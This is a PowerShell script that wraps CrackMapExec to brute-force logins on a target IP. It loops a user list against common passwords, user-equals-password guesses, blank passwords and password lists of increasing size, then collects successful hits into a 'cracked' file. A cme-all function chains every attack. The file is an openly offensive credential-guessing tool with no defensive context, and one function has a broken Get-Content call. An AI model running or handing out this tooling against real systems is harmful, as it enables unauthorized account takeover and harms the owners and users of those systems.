<#

Import-Module .\brute_cme_cs.ps1



To Do
===========
add in [target] [domain] - if domain is null


#>

$global:target=$args[0]
$global:userlist="users.txt"
$global:domain="."


function debug {
echo $target
echo $userlist
echo $domain
}



####################################
# CrackMapExecWin
####################################
function cme-check-cracked {
Get-Content -Path .\cme_*.log | findstr [+] | sort-object| Get-Unique | Tee cme_cracked.txt
}

function cme-password($target) {

if ($target) { 
Write-Output ""
Write-Output "[+] password"
ForEach ($user in Get-Content $userlist) {
.\crackmapexec.exe $target -d $domain -u $user -p password >> cme_brute_password.log
}
cme-check-cracked
} else {
Write-Host "USEAGE: " 
Write-Host "	cme-password  [IP ADDRESS]" 
Write-Host "" 
Write-Host "" 
}

}	
function cme-pass5($target) {
if ($target) { 
Write-Output ""
Write-Output "[+] pass5.txt"
ForEach ($user in Get-Content ) {
.\crackmapexec.exe -d $domain $target -u $user -p pass5.txt >> cme_brute_pass5.log
}  
cme-check-cracked
} else {
Write-Host "USEAGE: " 
Write-Host "	cme-pass5 [IP ADDRESS]" 
Write-Host "" 
Write-Host "" 
}
}
function cme-userpass($target) {
if ($target) { 
Write-Output ""
Write-Output "[+] user = password"
ForEach ($user in Get-Content $userlist) {
.\crackmapexec.exe -d $domain $target -u $user -p $user >> cme_brute_userpass.log
}  
cme-check-cracked
} else {
Write-Host "USEAGE: " 
Write-Host "	cme-userpass [IP ADDRESS]" 
Write-Host "" 
Write-Host "" 
}
}
function cme-blank($target) {
if ($target) { 
Write-Output ""
Write-Output "[+] pass_blank.txt"
ForEach ($user in Get-Content $userlist) {
.\crackmapexec.exe $target -u $user -p pass_blank.txt >> cme_brute_blank.log
} 
cme-check-cracked
} else {
Write-Host "USEAGE: " 
Write-Host "	cme-blank [IP ADDRESS]" 
Write-Host "" 
Write-Host "" 
}




}
function cme-pass10($target) {
if ($target) { 
Write-Output ""
Write-Output "[+] pass10.txt"
ForEach ($user in Get-Content $userlist) {
.\crackmapexec.exe $target -u $user -p pass10.txt >> cme_brute_pass10.log
}  
cme-check-cracked
} else {
Write-Host "USEAGE: " 
Write-Host "	cme-pass10 [IP ADDRESS]" 
Write-Host "" 
Write-Host "" 
}
	
	

}   
function cme-pass100($target) {
if ($target) { 
Write-Output ""
Write-Output "[+] pass100.txt"
ForEach ($user in Get-Content $userlist) {
.\crackmapexec.exe -d $domain  $target -u $user -p pass100.txt >> cme_brute_pass100.log
}  
cme-check-cracked
} else {
Write-Host "USEAGE: " 
Write-Host "	cme-pass100 [IP ADDRESS]" 
Write-Host "" 
Write-Host "" 
}


}

function cme-all($target) {
	
if ($target) { 
cme-password $target
cme-pass5 $target
cme-userpass $target
cme-blank $target
cme-pass10 $target
cme-pass100 $target

cme-check-cracked
} else {
Write-Host "USEAGE: " 
Write-Host "	cme-all [IP ADDRESS]" 
Write-Host "" 
Write-Host "" 

}

}
